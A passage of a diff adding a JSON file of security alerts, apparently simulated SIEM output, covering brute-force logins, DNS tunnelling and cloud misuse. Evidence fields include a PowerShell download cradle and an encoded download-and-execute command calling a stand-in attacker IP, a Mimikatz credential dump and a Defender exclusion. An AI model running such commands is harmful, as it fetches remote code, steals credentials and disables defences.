@@ -1,0 +1,1533 @@
+[
+  {
+    "alert_id": "ALT-80290E45",
+    "rule_id": "DET-003",
+    "rule_name": "Successful Login After Brute Force",
+    "description": "Successful authentication from an IP that previously had multiple failed attempts",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T05:34:42",
+    "created_at": "2026-02-19T11:27:32.558047",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Successful login from 198.51.100.23 after 274 failed attempts",
+    "recommended_response": "IMMEDIATE: Disable compromised account. Isolate host. Begin IR investigation.",
+    "evidence": {
+      "event_count": 4,
+      "sample_events": [
+        {
+          "event_id": "EVT-000335",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:33:59",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "root",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000336",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:34:16",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "mysql",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000337",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:34:42",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "backup",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000204",
+          "source": "windows_security",
+          "event_type": "authentication_success",
+          "timestamp": "2026-02-17T05:25:34.500000",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "svc_backup",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "service": "windows_logon",
+            "action": "successful_login"
+          }
+        }
+      ],
+      "failed_attempts": 274,
+      "source_ip": "198.51.100.23"
+    }
+  },
+  {
+    "alert_id": "ALT-C5BD9D94",
+    "rule_id": "DET-003",
+    "rule_name": "Successful Login After Brute Force",
+    "description": "Successful authentication from an IP that previously had multiple failed attempts",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T06:29:44",
+    "created_at": "2026-02-19T11:27:32.558060",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Successful login from 192.0.2.100 after 140 failed attempts",
+    "recommended_response": "IMMEDIATE: Disable compromised account. Isolate host. Begin IR investigation.",
+    "evidence": {
+      "event_count": 4,
+      "sample_events": [
+        {
+          "event_id": "EVT-000521",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:28:57",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "test",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000523",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:29:12",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "oracle",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000524",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:29:44",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "postgres",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000513",
+          "source": "linux_auth",
+          "event_type": "authentication_success",
+          "timestamp": "2026-02-17T06:27:56",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "deploy",
+            "service": "sshd",
+            "action": "successful_login"
+          }
+        }
+      ],
+      "failed_attempts": 140,
+      "source_ip": "192.0.2.100"
+    }
+  },
+  {
+    "alert_id": "ALT-A153D882",
+    "rule_id": "DET-006",
+    "rule_name": "Suspicious Sudo Command Execution",
+    "description": "Sudo used to execute high-risk commands (shell spawn, password change, user creation)",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1548.003",
+    "mitre_tactic": "Privilege Escalation",
+    "mitre_name": "Sudo and Sudo Caching",
+    "timestamp": "2026-02-17T08:00:00",
+    "created_at": "2026-02-19T11:27:32.558737",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Isolate host. Review all commands executed by this user.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000642",
+          "source": "linux_auth",
+          "event_type": "privilege_escalation",
+          "timestamp": "2026-02-17T08:00:00",
+          "details": {
+            "username": "deploy",
+            "command": "/bin/bash",
+            "action": "sudo_executed",
+            "unauthorized": false
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-701D9417",
+    "rule_id": "DET-007",
+    "rule_name": "Encoded PowerShell Execution",
+    "description": "PowerShell executed with encoded command (-enc flag)",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1059.001",
+    "mitre_tactic": "Execution",
+    "mitre_name": "Command and Scripting Interpreter: PowerShell",
+    "timestamp": "2026-02-17T10:00:00",
+    "created_at": "2026-02-19T11:27:32.559121",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Decode the command. Isolate endpoint. Check for C2 callbacks.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000667",
+          "source": "windows_security",
+          "event_type": "process_creation",
+          "timestamp": "2026-02-17T10:00:00",
+          "details": {
+            "username": "svc_backup",
+            "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
+            "process_name": "C:\\Windows\\System32\\powershell.exe",
+            "parent_process": "C:\\Windows\\System32\\cmd.exe",
+            "action": "process_created"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-9664284C",
+    "rule_id": "DET-009",
+    "rule_name": "Defense Evasion via PowerShell",
+    "description": "PowerShell used to disable security controls (Windows Defender, firewall)",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1562.001",
+    "mitre_tactic": "Defense Evasion",
+    "mitre_name": "Impair Defenses: Disable or Modify Tools",
+    "timestamp": "2026-02-17T10:04:00",
+    "created_at": "2026-02-19T11:27:32.559677",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Re-enable security tools. Isolate endpoint. Full forensic analysis.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000671",
+          "source": "windows_security",
+          "event_type": "process_creation",
+          "timestamp": "2026-02-17T10:04:00",
+          "details": {
+            "username": "svc_backup",
+            "command_line": "powershell.exe -ep bypass -c \"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\"",
+            "process_name": "C:\\Windows\\System32\\powershell.exe",
+            "parent_process": "C:\\Windows\\System32\\cmd.exe",
+            "action": "process_created"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-332B1762",
+    "rule_id": "DET-008",
+    "rule_name": "PowerShell Download Cradle",
+    "description": "PowerShell used to download and execute remote scripts",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1059.001",
+    "mitre_tactic": "Execution",
+    "mitre_name": "Command and Scripting Interpreter: PowerShell",
+    "timestamp": "2026-02-17T10:07:00",
+    "created_at": "2026-02-19T11:27:32.559404",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Block the download URL. Isolate endpoint. Scan for payloads.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000674",
+          "source": "windows_security",
+          "event_type": "process_creation",
+          "timestamp": "2026-02-17T10:07:00",
+          "details": {
+            "username": "svc_backup",
+            "command_line": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')\"",
+            "process_name": "C:\\Windows\\System32\\powershell.exe",
+            "parent_process": "C:\\Windows\\System32\\cmd.exe",
+            "action": "process_created"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-9E86DD61",
+    "rule_id": "DET-010",
+    "rule_name": "Credential Dumping Attempt",
+    "description": "Mimikatz or similar credential dumping tool execution detected",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1003.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "OS Credential Dumping: LSASS Memory",
+    "timestamp": "2026-02-17T10:12:00",
+    "created_at": "2026-02-19T11:27:32.559945",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Isolate host. Rotate ALL domain credentials. Check for lateral movement.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000680",
+          "source": "windows_security",
+          "event_type": "process_creation",
+          "timestamp": "2026-02-17T10:12:00",
+          "details": {
+            "username": "svc_backup",
+            "command_line": "powershell.exe -c \"Invoke-Mimikatz -Command '\\\"sekurlsa::logonpasswords\\\"'\"",
+            "process_name": "C:\\Windows\\System32\\powershell.exe",
+            "parent_process": "C:\\Windows\\System32\\cmd.exe",
+            "action": "process_created"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-5FFE9465",
+    "rule_id": "DET-003",
+    "rule_name": "Successful Login After Brute Force",
+    "description": "Successful authentication from an IP that previously had multiple failed attempts",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T11:38:39.744747",
+    "created_at": "2026-02-19T11:27:32.558067",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Successful login from 203.0.113.45 after 160 failed attempts",
+    "recommended_response": "IMMEDIATE: Disable compromised account. Isolate host. Begin IR investigation.",
+    "evidence": {
+      "event_count": 4,
+      "sample_events": [
+        {
+          "event_id": "EVT-000807",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:38:14.393637",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "admin",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account has been locked out",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000808",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:38:21.365637",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "jsmith",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "Bad username or authentication information",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000809",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T11:38:39.744747",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "sa",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account is disabled",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000625",
+          "source": "linux_auth",
+          "event_type": "authentication_success",
+          "timestamp": "2026-02-17T06:47:44",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "deploy",
+            "service": "sshd",
+            "action": "successful_login"
+          }
+        }
+      ],
+      "failed_attempts": 160,
+      "source_ip": "203.0.113.45"
+    }
+  },
+  {
+    "alert_id": "ALT-0C33363C",
+    "rule_id": "DET-022",
+    "rule_name": "DNS Tunneling Detected",
+    "description": "High volume of DNS queries with unusually long subdomains to a single domain",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1071.004",
+    "mitre_tactic": "Command and Control",
+    "mitre_name": "Application Layer Protocol: DNS",
+    "timestamp": "2026-02-17T13:09:14",
+    "created_at": "2026-02-19T11:27:32.562198",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 200 events from 10.0.1.50",
+    "recommended_response": "Block the C2 domain. Isolate the source host. Analyze DNS payloads.",
+    "evidence": {
+      "event_count": 200,
+      "sample_events": [
+        {
+          "event_id": "EVT-000821",
+          "source": "dns",
+          "event_type": "dns_query",
+          "timestamp": "2026-02-17T13:00:00",
+          "details": {
+            "query_domain": "mat81y0h6e9f9gh5t9c2lx60q4hc945vmi5mbtfff91kd76jidkhtg.161.cdn-update.evil-corp.xyz",
+            "query_type": "A",
+            "source_ip": "10.0.1.50",
+            "action": "dns_lookup",
+            "suspicious": true,
+            "reason": "unusually_long_subdomain"
+          }
+        },
+        {
+          "event_id": "EVT-000822",
+          "source": "dns",
+          "event_type": "dns_query",
+          "timestamp": "2026-02-17T13:00:02",
+          "details": {
+            "query_domain": "06qfmfrvok4lfcdaopfrghi4xwkjgsb0r4j3doo1pk6d3rmlug2.326.cdn-update.evil-corp.xyz",
+            "query_type": "TXT",
+            "source_ip": "10.0.1.50",
+            "action": "dns_lookup",
+            "suspicious": true,
+            "reason": "unusually_long_subdomain"
+          }
+        },
+        {
+          "event_id": "EVT-000823",
+          "source": "dns",
+          "event_type": "dns_query",
+          "timestamp": "2026-02-17T13:00:02",
+          "details": {
+            "query_domain": "ciridm4fq6f064yapn2sqaoar15aai6hp8sy3q22.435.cdn-update.evil-corp.xyz",
+            "query_type": "A",
+            "source_ip": "10.0.1.50",
+            "action": "dns_lookup",
+            "suspicious": true,
+            "reason": "unusually_long_subdomain"
+          }
+        },
+        {
+          "event_id": "EVT-000824",
+          "source": "dns",
+          "event_type": "dns_query",
+          "timestamp": "2026-02-17T13:00:02",
+          "details": {
+            "query_domain": "p8y0bom9rglcngzb8z90qnruary2f6ihqfnmxfrd065ufoy12h2m47pd2.524.cdn-update.evil-corp.xyz",
+            "query_type": "CNAME",
+            "source_ip": "10.0.1.50",
+            "action": "dns_lookup",
+            "suspicious": true,
+            "reason": "unusually_long_subdomain"
+          }
+        },
+        {
+          "event_id": "EVT-000825",
+          "source": "dns",
+          "event_type": "dns_query",
+          "timestamp": "2026-02-17T13:00:02",
+          "details": {
+            "query_domain": "4vhl3cm8r3kte9j86doi7kkeaahx06cmmn5fx2cg6.866.cdn-update.evil-corp.xyz",
+            "query_type": "A",
+            "source_ip": "10.0.1.50",
+            "action": "dns_lookup",
+            "suspicious": true,
+            "reason": "unusually_long_subdomain"
+          }
+        }
+      ],
+      "group_key": "10.0.1.50"
+    }
+  },
+  {
+    "alert_id": "ALT-9B627ED1",
+    "rule_id": "DET-024",
+    "rule_name": "Suspicious S3 Bulk Data Access",
+    "description": "Large volume of S3 GetObject requests for sensitive files from external IP",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1537",
+    "mitre_tactic": "Exfiltration",
+    "mitre_name": "Transfer Data to Cloud Account",
+    "timestamp": "2026-02-17T15:02:00",
+    "created_at": "2026-02-19T11:27:32.562425",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Revoke access credentials. Enable S3 bucket versioning. Review bucket policies.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001042",
+          "source": "aws_s3",
+          "event_type": "s3_access",
+          "timestamp": "2026-02-17T15:02:00",
+          "details": {
+            "event_name": "GetObject",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "bucket_name": "corpsec-prod-data",
+            "key": "hr/employees/salary_data_2026.csv",
+            "bytes_transferred": 185533027,
+            "action": "GetObject",
+            "suspicious": true,
+            "reason": "large_data_download"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-C33A5757",
+    "rule_id": "DET-016",
+    "rule_name": "AWS IAM Policy Escalation",
+    "description": "AdministratorAccess or high-privilege policy attached to a user",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1098.001",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Account Manipulation: Additional Cloud Credentials",
+    "timestamp": "2026-02-17T18:12:00",
+    "created_at": "2026-02-19T11:27:32.561141",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Detach the policy. Investigate who made the change. Rotate keys.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001081",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:12:00",
+          "details": {
+            "event_name": "AttachUserPolicy",
+            "event_source": "iam.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "UserName": "dev-ops-svc",
+              "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+            },
+            "error_code": null,
+            "action": "AttachUserPolicy"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-4C01E2CE",
+    "rule_id": "DET-019",
+    "rule_name": "AWS Security Group Opened to World",
+    "description": "Security group rule allows inbound traffic from 0.0.0.0/0",
+    "severity": "CRITICAL",
+    "mitre_technique": "T1562.007",
+    "mitre_tactic": "Defense Evasion",
+    "mitre_name": "Impair Defenses: Disable or Modify Cloud Firewall",
+    "timestamp": "2026-02-17T18:55:00",
+    "created_at": "2026-02-19T11:27:32.561583",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "IMMEDIATE: Revoke the rule. Review all security groups for similar misconfigurations.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-001098",
+          "source": "aws_cloudtrail",
+          "event_type": "cloud_api_call",
+          "timestamp": "2026-02-17T18:55:00",
+          "details": {
+            "event_name": "AuthorizeSecurityGroupIngress",
+            "event_source": "ec2.amazonaws.com",
+            "source_ip": "198.51.100.23",
+            "user_name": "dev-ops-svc",
+            "region": "eu-west-1",
+            "access_key": "AKIAIOSFODNN7EXAMPLE",
+            "request_params": {
+              "GroupName": "debug-sg",
+              "IpProtocol": "tcp",
+              "FromPort": 0,
+              "ToPort": 65535,
+              "CidrIp": "0.0.0.0/0"
+            },
+            "error_code": null,
+            "action": "AuthorizeSecurityGroupIngress"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-85F8643E",
+    "rule_id": "DET-011",
+    "rule_name": "Suspicious Cron Job Creation",
+    "description": "New cron job created with suspicious command (reverse shell, download)",
+    "severity": "HIGH",
+    "mitre_technique": "T1053.003",
+    "mitre_tactic": "Persistence",
+    "mitre_name": "Scheduled Task/Job: Cron",
+    "timestamp": "2026-02-17T01:00:00",
+    "created_at": "2026-02-19T11:27:32.560142",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Pattern match detected",
+    "recommended_response": "Review and remove malicious cron entries. Investigate compromised user.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000007",
+          "source": "linux_auth",
+          "event_type": "scheduled_task",
+          "timestamp": "2026-02-17T01:00:00",
+          "details": {
+            "action": "cron_execution",
+            "command": "/opt/app/scripts/backup.sh)"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "alert_id": "ALT-1D8C6FA3",
+    "rule_id": "DET-025",
+    "rule_name": "Connection to Known Malicious IP",
+    "description": "Network connection to a known threat intelligence indicator",
+    "severity": "HIGH",
+    "mitre_technique": "T1071",
+    "mitre_tactic": "Command and Control",
+    "mitre_name": "Application Layer Protocol",
+    "timestamp": "2026-02-17T05:21:00",
+    "created_at": "2026-02-19T11:27:32.562569",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threat intel match: ip 198.51.100.23",
+    "recommended_response": "Block the indicator. Isolate affected hosts. Run full malware scan.",
+    "evidence": {
+      "event_count": 1,
+      "sample_events": [
+        {
+          "event_id": "EVT-000035",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:00",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "admin",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "Bad username or authentication information",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "threat_intel": {
+        "found": true,
+        "indicator": "198.51.100.23",
+        "type": "ip",
+        "reputation": "malicious",
+        "tags": [
+          "brute_force",
+          "c2",
+          "data_exfil"
+        ],
+        "source": "AlienVault OTX",
+        "first_seen": "2025-11-15",
+        "country": "RU",
+        "asn": "AS12345 Evil Corp Hosting",
+        "confidence": 95
+      }
+    }
+  },
+  {
+    "alert_id": "ALT-5DE2D809",
+    "rule_id": "DET-002",
+    "rule_name": "Windows RDP Brute Force Detected",
+    "description": "Multiple failed Windows logon attempts (Event 4625) from the same source IP",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T05:26:02.945728",
+    "created_at": "2026-02-19T11:27:32.557842",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 171 events from 198.51.100.23",
+    "recommended_response": "Block source IP. Enable account lockout policies. Review RDP exposure.",
+    "evidence": {
+      "event_count": 171,
+      "sample_events": [
+        {
+          "event_id": "EVT-000035",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:00",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "admin",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "Bad username or authentication information",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000036",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:01.510117",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "jsmith",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The specified user does not exist",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000037",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:03.031580",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "administrator",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account has been locked out",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000038",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:04.000452",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "administrator",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "Bad username or authentication information",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000039",
+          "source": "windows_security",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:21:04.213473",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "user1",
+            "domain": "CORPSEC",
+            "logon_type": "10",
+            "failure_reason": "The user account has been locked out",
+            "service": "windows_logon",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "group_key": "198.51.100.23"
+    }
+  },
+  {
+    "alert_id": "ALT-8AD8F4B8",
+    "rule_id": "DET-001",
+    "rule_name": "SSH Brute Force Detected",
+    "description": "Multiple failed SSH login attempts from the same source IP within a short timeframe",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T05:34:42",
+    "created_at": "2026-02-19T11:27:32.557601",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 103 events from 198.51.100.23",
+    "recommended_response": "Block source IP at firewall. Rotate credentials for targeted accounts.",
+    "evidence": {
+      "event_count": 103,
+      "sample_events": [
+        {
+          "event_id": "EVT-000207",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:30:00",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "oracle",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000208",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:30:02",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "admin",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000209",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:30:04",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "postgres",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000211",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:30:06",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "backup",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000212",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T05:30:07",
+          "details": {
+            "source_ip": "198.51.100.23",
+            "username": "oracle",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "group_key": "198.51.100.23"
+    }
+  },
+  {
+    "alert_id": "ALT-9F83AB6D",
+    "rule_id": "DET-001",
+    "rule_name": "SSH Brute Force Detected",
+    "description": "Multiple failed SSH login attempts from the same source IP within a short timeframe",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T06:29:44",
+    "created_at": "2026-02-19T11:27:32.557634",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 140 events from 192.0.2.100",
+    "recommended_response": "Block source IP at firewall. Rotate credentials for targeted accounts.",
+    "evidence": {
+      "event_count": 140,
+      "sample_events": [
+        {
+          "event_id": "EVT-000341",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:23:00",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "www-data",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000343",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:23:01",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "www-data",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000344",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:23:03",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "mysql",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000345",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:23:03",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "ubuntu",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000346",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:23:04",
+          "details": {
+            "source_ip": "192.0.2.100",
+            "username": "postgres",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        }
+      ],
+      "group_key": "192.0.2.100"
+    }
+  },
+  {
+    "alert_id": "ALT-B8528AB8",
+    "rule_id": "DET-001",
+    "rule_name": "SSH Brute Force Detected",
+    "description": "Multiple failed SSH login attempts from the same source IP within a short timeframe",
+    "severity": "HIGH",
+    "mitre_technique": "T1110.001",
+    "mitre_tactic": "Credential Access",
+    "mitre_name": "Brute Force: Password Guessing",
+    "timestamp": "2026-02-17T06:48:28",
+    "created_at": "2026-02-19T11:27:32.557648",
+    "triage_status": "NEW",
+    "triage_classification": null,
+    "analyst_notes": "",
+    "detail": "Threshold exceeded: 78 events from 203.0.113.45",
+    "recommended_response": "Block source IP at firewall. Rotate credentials for targeted accounts.",
+    "evidence": {
+      "event_count": 78,
+      "sample_events": [
+        {
+          "event_id": "EVT-000527",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:45:00",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "oracle",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000528",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
+          "timestamp": "2026-02-17T06:45:00",
+          "details": {
+            "source_ip": "203.0.113.45",
+            "username": "ubuntu",
+            "service": "sshd",
+            "action": "failed_login"
+          }
+        },
+        {
+          "event_id": "EVT-000530",
+          "source": "linux_auth",
+          "event_type": "authentication_failure",
